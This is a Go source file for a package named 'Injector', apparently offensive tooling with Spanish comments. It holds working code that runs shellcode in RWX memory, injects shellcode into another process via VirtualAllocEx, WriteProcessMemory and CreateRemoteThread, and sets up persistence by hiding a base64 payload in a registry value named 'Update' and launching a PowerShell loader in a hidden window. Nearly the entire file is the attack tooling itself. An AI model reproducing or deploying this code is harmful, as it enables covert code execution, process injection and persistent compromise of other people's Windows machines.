package Injector

import (
	"fmt"
	"github.com/RachidMoysePolania/Injector/utils"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"os/exec"
	"syscall"
	"unsafe"
)

func Memory(shellcode []byte) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	rtlmemory := kernel32.NewProc("RtlMoveMemory")
	memdir, err := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("Error en la asignacion de la memoria: %v", err.Error()))
	}
	_, _, _ = rtlmemory.Call(memdir, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var oldProtect uint32
	err = windows.VirtualProtect(memdir, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[*]VirtualProtect: %v", err.Error()))
	}

	_, _, _ = syscall.Syscall(memdir, 0, 0, 0, 0)
}

func Process(shellcode []byte, pid uint32) {
	MEM_COMMIT := uintptr(0x1000)
	PAGE_EXECUTE_READWRITE := uintptr(0x40)
	PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)

	kernel32 := syscall.MustLoadDLL("kernel32.dll")

	openprocess := kernel32.MustFindProc("OpenProcess")
	vallocexe := kernel32.MustFindProc("VirtualAllocEx")
	writememory := kernel32.MustFindProc("WriteProcessMemory")
	remote := kernel32.MustFindProc("CreateRemoteThread")
	closeHandler := kernel32.MustFindProc("CloseHandle")

	processHandler, _, _ := openprocess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	remotebuffer, _, _ := vallocexe.Call(processHandler, 0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	writememory.Call(processHandler, remotebuffer, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	remote.Call(processHandler, 0, 0, remotebuffer, 0, 0, 0)
	closeHandler.Call(processHandler)
}

func Persistence(payload string) (bool, []byte, error) {
	//Tener en cuenta que el payload debe estar encodeado en base64
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Wow6432Node\`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return false, nil, err
	}
	if err := k.SetStringValue("Update", payload); err != nil {
		return false, nil, err
	}
	if err := k.Close(); err != nil {
		return false, nil, err
	}
	//El  comando que resive aca debe ser el loader ps1.
	output, err := func() ([]byte, error) {
		c := exec.Command("powershell.exe", utils.PersistenceLoader)
		c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := c.CombinedOutput()
		if err != nil {
			return nil, err
		}
		return output, err
	}()

	return true, output, nil
}
